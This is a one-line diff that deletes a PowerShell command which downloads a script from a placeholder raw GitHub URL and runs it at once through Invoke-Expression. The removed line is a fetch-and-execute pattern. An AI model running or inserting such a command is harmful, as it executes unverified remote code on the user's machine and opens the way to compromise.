@@ -1,1 +1,0 @@
-iex (iwr 'https://raw.githubusercontent.com/user/repo/master/script.ps1' -UseBasicParsing)
